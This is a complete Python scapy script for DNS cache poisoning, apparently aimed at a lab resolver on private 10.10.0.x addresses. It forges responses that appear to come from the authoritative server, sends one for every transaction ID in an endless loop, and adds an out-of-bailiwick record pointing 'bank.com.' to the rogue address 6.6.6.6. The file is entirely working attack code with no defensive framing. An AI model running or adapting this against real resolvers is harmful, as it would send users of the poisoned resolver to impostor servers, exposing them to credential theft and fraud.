import os
import time

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send  # type: ignore

RESOLVER_IP = os.getenv("RESOLVER_IP", "10.10.0.53")
AUTH_IP = os.getenv("AUTH_IP", "10.10.0.100")
RESOLVER_UPSTREAM_PORT = int(os.getenv("RESOLVER_UPSTREAM_PORT", "33333"))
TXID_SPACE = max(1, min(65536, int(os.getenv("TXID_SPACE", "65536"))))
TXID_SCAN_LIMIT = max(1, min(TXID_SPACE, int(os.getenv("TXID_SCAN_LIMIT", str(TXID_SPACE)))))

QNAME = "victim.example.net."
POISON_DOMAIN = "bank.com."
POISON_IP = "6.6.6.6"
LEGIT_EXAMPLE_IP = "198.51.100.10"


def build_packet(txid: int):
    return (
        IP(src=AUTH_IP, dst=RESOLVER_IP)
        / UDP(sport=53, dport=RESOLVER_UPSTREAM_PORT)
        / DNS(
            id=txid,
            qr=1,
            aa=1,
            rd=1,
            qd=DNSQR(qname=QNAME, qtype="A"),
            an=DNSRR(rrname=QNAME, type="A", ttl=60, rdata=LEGIT_EXAMPLE_IP),
            ar=DNSRR(rrname=POISON_DOMAIN, type="A", ttl=300, rdata=POISON_IP),
            ancount=1,
            arcount=1,
        )
    )


def main():
    print(
        "[*] Flooding spoofed OoB DNS responses "
        f"(txid_space={TXID_SPACE}, scan_limit={TXID_SCAN_LIMIT}, "
        f"dport={RESOLVER_UPSTREAM_PORT})..."
    )
    packets = [build_packet(txid) for txid in range(TXID_SCAN_LIMIT)]

    while True:
        send(packets, verbose=0)
        time.sleep(0.03)


if __name__ == "__main__":
    main()
